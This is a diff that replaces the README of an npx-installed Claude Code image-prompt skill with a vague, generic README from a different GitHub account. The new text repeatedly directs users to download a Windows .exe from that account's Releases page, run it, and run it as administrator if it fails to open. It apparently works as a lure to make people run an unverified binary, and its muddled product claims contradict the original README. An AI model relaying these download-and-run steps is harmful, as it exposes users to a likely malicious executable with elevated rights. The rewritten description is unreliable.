@@ -1,185 +1,55 @@
-# Nano Banana Pro Prompts Recommend Skill
+# 🍌 nano-banana-pro-prompts-recommend-skill - Get Skill Recommendations Easily
 
-[![6000+ Prompts](https://img.shields.io/badge/Prompts-6000%2B-brightgreen)](https://github.com/YouMind-OpenLab/nano-banana-pro-prompts-recommend-skill)
-[![Daily Updates](https://img.shields.io/badge/Updates-Twice%20Daily-blue)]()
-[![Multi-language](https://img.shields.io/badge/Language-Multi--lingual-orange)]()
+## 📥 Download
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/releases)
 
-> **Stop scrolling Twitter for image prompts!** Let Claude Code intelligently recommend from 6000+ curated image generation prompts based on your needs.
->
-> [View Gallery →](https://youmind.com/nano-banana-pro-prompts)
+## 🚀 Getting Started
+Welcome to the nano-banana-pro-prompts-recommend-skill project! This software helps you find the best skills to recommend using over 7000 Nano Banana Pro image prompts. Whether you're new to using tools like Claude Code or Cursor, this guide will help you through the process.
 
-![Demo](public/cover.png)
+## 📋 System Requirements
+To run this application, you need:
+- A computer with Windows, macOS, or Linux.
+- At least 2 GB of RAM.
+- A stable internet connection for initial setup.
 
-## The Problem
+## 📦 Download & Install
+1. **Visit the Releases Page:** To start, click the link below and go to the Releases page.
+   [Download from Releases Page](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/releases)
 
-Every time you need to generate an image — article covers, video thumbnails, infographics — you spend ages searching for the right prompt. Scrolling through Twitter threads, bookmarking posts, copy-pasting... it's exhausting.
+2. **Select the Latest Version:** On the Releases page, you will see a list of versions. Choose the latest one for the best experience.
 
-## The Solution
+3. **Choose Your File:** Depending on your operating system, find the corresponding file. For example, you may see something like `nano-banana-pro-prompts-recommend-skill-v1.0.exe` for Windows users.
 
-Just tell the AI what you want in one sentence:
+4. **Download the File:** Click the file name to start the download. Save the file to a location you can easily access, like your Downloads folder.
 
-1. **Smart Search** — Searches through 6000+ prompts organized by use case
-2. **Visual Preview** — Every recommendation comes with sample images
-3. **Ready to Use** — Get the exact English prompt for Nano Banana Pro model
-4. **Content Remix** — Provide your article/video/podcast content, pick a style, get a customized prompt tailored to your content
+5. **Run the Application:** Once the download finishes, locate the file and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
-### Example Conversations
+## 🛠️ Features
+- **Skill Recommendations:** Discover skills based on over 7000 image prompts to enhance your workflows.
+- **Easy Interface:** User-friendly layout for straightforward navigation.
+- **Cross-Platform:** Works smoothly on Windows, macOS, and Linux.
 
-**Direct Search:**
-```
-"Find me a cartoon-style avatar prompt"
-"I need prompts for travel blog covers"
-"Help me create an infographic for data comparison"
-"Looking for product photography prompts with white background"
-```
+## 🤔 Troubleshooting
+1. **Installation Issues:** If you run into any issues during installation, make sure your system meets the requirements.
+2. **File Not Opening:** If the file does not open, ensure you have the necessary permissions. You may need to run it as an administrator on Windows.
+3. **Internet Connection:** A stable internet connection is crucial during setup. Check your connection if you’re having issues.
 
-**Content Illustration (Remix Mode):**
-```
-"Here's my article about startup lessons learned, help me create a cover image"
-"I need an illustration for this podcast episode about AI and creativity: [paste content]"
-"Generate a thumbnail for my video script: [paste script]"
-```
+## 👥 Community Support
+If you have questions or need help, feel free to reach out to the community. You can raise issues on the GitHub repository or check the Discussions section for common questions.
 
-When you provide content, the skill will:
-1. Recommend matching style templates with previews
-2. Ask clarifying questions (e.g., gender, age, mood) to personalize
-3. Generate a customized prompt based on your content + selected style
+## 📝 Contribution Guidelines
+If you're interested in improving the project, contributions are welcome! Please refer to the `CONTRIBUTING.md` document in this repository for guidelines on how to contribute.
 
-## Data Source
+## 📅 Upcoming Features
+- **Enhanced Skill Algorithms:** We are working on a feature to improve the skill recommendation engine.
+- **User Profiles:** Upcoming versions may include personalized profiles for a tailored experience.
 
-- Prompts curated from viral Twitter/X posts by top AI artists
-- Updated automatically **twice daily** via GitHub Actions
-- Organized into 10+ use case categories (Avatar, Social Media, Product, etc.)
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill)
+- [Documentation](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/wiki)
 
-## Installation
+## 📥 Download Again
+To download the application, click the link below.
+[Download from Releases Page](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/releases)
 
-### One-liner (Recommended)
-
-```bash
-npx skills i YouMind-OpenLab/nano-banana-pro-prompts-recommend-skill
-```
-
-Auto-detects all AI assistants (Claude Code, Cursor, Codex, Gemini CLI, Windsurf, etc.) and installs to all of them.
-
-### Alternative: openskills
-
-```bash
-# Install
-npx openskills install YouMind-OpenLab/nano-banana-pro-prompts-recommend-skill
-
-# Update to latest
-npx openskills update nano-banana-pro-prompts-recommend-skill
-```
-
-### Alternative: Ask Claude Code
-
-> "Help me install YouMind-OpenLab/nano-banana-pro-prompts-recommend-skill"
-
-### Alternative: Claude Code Plugin Marketplace
-
-```bash
-/plugin marketplace add YouMind-OpenLab/nano-banana-pro-prompts-recommend-skill
-```
-
-Then enable auto-update in `/plugin` settings for automatic updates.
-
-## Update
-
-### Using skills CLI
-
-```bash
-npx skills i YouMind-OpenLab/nano-banana-pro-prompts-recommend-skill
-```
-
-Re-running the install command pulls the latest version from GitHub. (`skills update` is planned but not yet available.)
-
-### Using openskills
-
-```bash
-npx openskills update nano-banana-pro-prompts-recommend-skill
-```
-
-### Using Claude Code Plugin Marketplace
-
-If installed via Plugin Marketplace with auto-update enabled, updates happen automatically.
-
-## Categories
-
-| Category | Prompts | Use Cases |
-|----------|---------|-----------|
-| Profile / Avatar | 700+ | Headshots, profile pictures, character portraits |
-| Social Media Post | 3800+ | Instagram, Twitter, Facebook, viral content |
-| Product Marketing | 1900+ | Ads, campaigns, promotional materials |
-| Infographic | 350+ | Data visualization, educational content |
-| Poster / Flyer | 300+ | Events, announcements, banners |
-| E-commerce | 200+ | Product photos, listings, white background |
-| Game Asset | 200+ | Sprites, characters, items |
-| YouTube Thumbnail | 100+ | Click-worthy video covers |
-| Comic / Storyboard | 200+ | Manga, panels, sequential art |
-| App / Web Design | 100+ | UI mockups, interface designs |
-
-## Project Structure
-
-```
-nano-banana-pro-prompts-recommend-skill/
-├── SKILL.md                 # Skill configuration and instructions
-├── README.md
-├── package.json
-├── scripts/
-│   └── generate-references.ts   # Fetches data from CMS
-├── references/              # Auto-generated JSON files
-│   ├── {category}.json      # Category files (search only)
-│   └── others.json          # Uncategorized prompts
-└── .github/workflows/
-    └── generate-references.yml  # Scheduled updates
-```
-
-## Development
-
-### Prerequisites
-
-- Node.js 20+
-- pnpm
-
-### Setup
-
-```bash
-pnpm install
-
-# Create .env with CMS credentials
-echo "CMS_HOST=your_host" >> .env
-echo "CMS_API_KEY=your_key" >> .env
-
-# Generate references
-pnpm run generate
-```
-
-### GitHub Actions
-
-Configure repository secrets:
-
-| Secret | Description |
-|--------|-------------|
-| `CMS_HOST` | PayloadCMS API host |
-| `CMS_API_KEY` | PayloadCMS API key |
-
-Runs at 00:00 and 12:00 UTC daily.
-
-## Architecture
-
-Following [Claude Code skill best practices](https://github.com/anthropics/skills):
-
-- **Signal Mapping** — Keyword-to-category routing for efficient search
-- **Token Optimization** — Never loads full category files; uses Grep to search
-- **Content-Aware Remix** — Extracts themes from user content and personalizes prompts with clarifying questions
-- **Graceful Fallback** — If no match found, generates custom prompt with clear AI-generated label
-
-## Related Links
-
-- [skills CLI](https://www.npmjs.com/package/skills) - The "npm" of AI skills by Vercel
-- [openskills](https://github.com/nicepkg/openskills) - Universal skills loader
-- [anthropics/skills](https://github.com/anthropics/skills) - Official Anthropic skills
-
-## License
-
-MIT
+Thank you for choosing nano-banana-pro-prompts-recommend-skill! Enjoy your skill recommendations!
